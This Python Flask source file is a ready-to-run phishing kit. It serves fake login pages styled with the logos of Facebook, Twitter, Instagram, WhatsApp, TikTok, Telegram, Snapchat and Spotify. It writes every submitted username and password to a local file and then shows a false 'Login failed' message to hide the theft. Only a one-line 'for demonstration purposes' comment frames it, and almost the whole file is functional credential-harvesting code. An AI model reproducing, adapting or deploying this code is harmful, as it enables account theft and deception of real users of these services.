from flask import Flask, request, render_template_string
import os

app = Flask(__name__)

# Log file to store captured credentials
LOG_FILE = "credentials.txt"

# Fake login page templates with logos and styling
TEMPLATES = {
    "facebook": """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Facebook Login</title>
        <style>
            body { font-family: Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
            .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); text-align: center; width: 300px; }
            .logo { width: 100px; margin-bottom: 20px; }
            input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; }
            input[type="submit"] { background-color: #1877f2; color: white; border: none; cursor: pointer; }
            input[type="submit"]:hover { background-color: #165dbb; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook Logo" class="logo">
            <h2>Log in to Facebook</h2>
            <form method="POST" action="/login">
                <input type="text" id="username" name="username" placeholder="Email or Phone Number"><br>
                <input type="password" id="password" name="password" placeholder="Password"><br>
                <input type="submit" value="Log In">
            </form>
        </div>
    </body>
    </html>
    """,
    "twitter": """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Twitter Login</title>
        <style>
            body { font-family: Arial, sans-serif; background-color: #e1e8ed; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
            .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); text-align: center; width: 300px; }
            .logo { width: 50px; margin-bottom: 20px; }
            input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; }
            input[type="submit"] { background-color: #1da1f2; color: white; border: none; cursor: pointer; }
            input[type="submit"]:hover { background-color: #1991db; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4f/Twitter-logo.svg/1200px-Twitter-logo.svg.png" alt="Twitter Logo" class="logo">
            <h2>Log in to Twitter</h2>
            <form method="POST" action="/login">
                <input type="text" id="username" name="username" placeholder="Username or email"><br>
                <input type="password" id="password" name="password" placeholder="Password"><br>
                <input type="submit" value="Log In">
            </form>
        </div>
    </body>
    </html>
    """,
    "instagram": """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Instagram Login</title>
        <style>
            body { font-family: Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
            .login-box { background: white; padding: 20px; border: 1px solid #ddd; border-radius: 8px; text-align: center; width: 300px; }
            .logo { width: 100px; margin-bottom: 20px; }
            input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; }
            input[type="submit"] { background-color: #0095f6; color: white; border: none; cursor: pointer; }
            input[type="submit"]:hover { background-color: #0077c2; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/1200px-Instagram_logo_2016.svg.png" alt="Instagram Logo" class="logo">
            <h2>Log in to Instagram</h2>
            <form method="POST" action="/login">
                <input type="text" id="username" name="username" placeholder="Username, email, or phone"><br>
                <input type="password" id="password" name="password" placeholder="Password"><br>
                <input type="submit" value="Log In">
            </form>
        </div>
    </body>
    </html>
    """,
    "whatsapp": """
    <!DOCTYPE html>
    <html>
    <head>
        <title>WhatsApp Login</title>
        <style>
            body { font-family: Arial, sans-serif; background-color: #25d366; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
            .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); text-align: center; width: 300px; }
            .logo { width: 100px; margin-bottom: 20px; }
            input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; }
            input[type="submit"] { background-color: #25d366; color: white; border: none; cursor: pointer; }
            input[type="submit"]:hover { background-color: #128c7e; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/1200px-WhatsApp.svg.png" alt="WhatsApp Logo" class="logo">
            <h2>Log in to WhatsApp</h2>
            <form method="POST" action="/login">
                <input type="text" id="username" name="username" placeholder="Phone Number"><br>
                <input type="password" id="password" name="password" placeholder="Password"><br>
                <input type="submit" value="Log In">
            </form>
        </div>
    </body>
    </html>
    """,
    "tiktok": """
    <!DOCTYPE html>
    <html>
    <head>
        <title>TikTok Login</title>
        <style>
            body { font-family: Arial, sans-serif; background-color: #000; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
            .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); text-align: center; width: 300px; }
            .logo { width: 100px; margin-bottom: 20px; }
            input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; }
            input[type="submit"] { background-color: #000; color: white; border: none; cursor: pointer; }
            input[type="submit"]:hover { background-color: #333; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a9/TikTok_logo.svg/1200px-TikTok_logo.svg.png" alt="TikTok Logo" class="logo">
            <h2>Log in to TikTok</h2>
            <form method="POST" action="/login">
                <input type="text" id="username" name="username" placeholder="Username or Email"><br>
                <input type="password" id="password" name="password" placeholder="Password"><br>
                <input type="submit" value="Log In">
            </form>
        </div>
    </body>
    </html>
    """,
    "telegram": """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Telegram Login</title>
        <style>
            body { font-family: Arial, sans-serif; background-color: #0088cc; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
            .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); text-align: center; width: 300px; }
            .logo { width: 100px; margin-bottom: 20px; }
            input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; }
            input[type="submit"] { background-color: #0088cc; color: white; border: none; cursor: pointer; }
            input[type="submit"]:hover { background-color: #006699; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Telegram_logo.svg/1200px-Telegram_logo.svg.png" alt="Telegram Logo" class="logo">
            <h2>Log in to Telegram</h2>
            <form method="POST" action="/login">
                <input type="text" id="username" name="username" placeholder="Phone Number"><br>
                <input type="password" id="password" name="password" placeholder="Password"><br>
                <input type="submit" value="Log In">
            </form>
        </div>
    </body>
    </html>
    """,
    "snapchat": """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Snapchat Login</title>
        <style>
            body { font-family: Arial, sans-serif; background-color: #fffc00; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
            .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); text-align: center; width: 300px; }
            .logo { width: 100px; margin-bottom: 20px; }
            input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; }
            input[type="submit"] { background-color: #fffc00; color: black; border: none; cursor: pointer; }
            input[type="submit"]:hover { background-color: #e6e600; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e4/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png" alt="Snapchat Logo" class="logo">
            <h2>Log in to Snapchat</h2>
            <form method="POST" action="/login">
                <input type="text" id="username" name="username" placeholder="Username or Email"><br>
                <input type="password" id="password" name="password" placeholder="Password"><br>
                <input type="submit" value="Log In">
            </form>
        </div>
    </body>
    </html>
    """,
    "spotify": """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Spotify Login</title>
        <style>
            body { font-family: Arial, sans-serif; background-color: #1db954; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
            .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); text-align: center; width: 300px; }
            .logo { width: 100px; margin-bottom: 20px; }
            input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; }
            input[type="submit"] { background-color: #1db954; color: white; border: none; cursor: pointer; }
            input[type="submit"]:hover { background-color: #1aa34a; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/19/Spotify_logo_without_text.svg/1200px-Spotify_logo_without_text.svg.png" alt="Spotify Logo" class="logo">
            <h2>Log in to Spotify</h2>
            <form method="POST" action="/login">
                <input type="text" id="username" name="username" placeholder="Username or Email"><br>
                <input type="password" id="password" name="password" placeholder="Password"><br>
                <input type="submit" value="Log In">
            </form>
        </div>
    </body>
    </html>
    """
}

# Route to display the fake login page
@app.route('/<platform>')
def login(platform):
    if platform in TEMPLATES:
        return render_template_string(TEMPLATES[platform])
    else:
        return "Invalid platform."

# Route to handle form submission
@app.route('/login', methods=['POST'])
def handle_login():
    username = request.form.get('username')
    password = request.form.get('password')

    # Log the credentials to a file (for demonstration purposes)
    with open(LOG_FILE, "a") as f:
        f.write(f"Platform: {request.referrer}, Username: {username}, Password: {password}\n")

    return "Login failed. Please try again."

if __name__ == '__main__':
    # Run the server on localhost, port 5000
    app.run(host='0.0.0.0', port=5000)